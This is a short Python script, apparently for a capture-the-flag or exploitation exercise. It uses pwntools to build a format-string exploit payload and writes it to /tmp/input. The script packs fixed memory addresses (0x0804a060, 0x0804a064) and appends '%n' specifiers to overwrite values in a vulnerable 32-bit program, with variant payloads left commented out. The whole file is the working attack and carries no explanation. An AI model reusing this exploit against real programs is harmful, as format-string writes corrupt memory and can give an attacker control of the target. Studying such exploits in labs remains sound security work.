from pwn import *

key  = 0x0804a060
key2 = 0x0804a064

formats = [
  p32(key)  + b'%n',
  p32(key2) + b'%n',
  p32(key + 1) + b'%n'
]
payload = p32(key)  + b'%n' + b'\n' # + p32(key2) + b'%n' + b'\n' + p32(key + 1) + b'%n' + b'\n'

f = open('/tmp/input', 'wb')
f.write(payload)
